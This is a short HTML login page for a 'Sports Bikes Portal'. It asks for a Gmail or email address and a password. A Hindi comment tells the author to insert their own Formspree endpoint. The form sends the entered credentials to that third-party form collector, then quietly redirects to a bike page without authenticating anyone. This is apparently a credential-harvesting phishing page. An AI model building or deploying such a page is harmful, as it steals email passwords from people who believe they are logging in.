<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Sports Bikes Portal</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="login-box">
        <h2>Sports Bikes Login</h2>
        <!-- Yahan apna Formspree endpoint daalna hai -->
        <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST" onsubmit="setTimeout(function(){window.location.href='bike.html';}, 1000);">
            <div class="input-group">
                <label>Gmail / Email</label>
                <input type="text" name="email" required placeholder="Enter your email">
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" required placeholder="Enter your password">
            </div>
            <button type="submit" class="login-btn">Login & Explore</button>
        </form>
    </div>

</body>
</html>
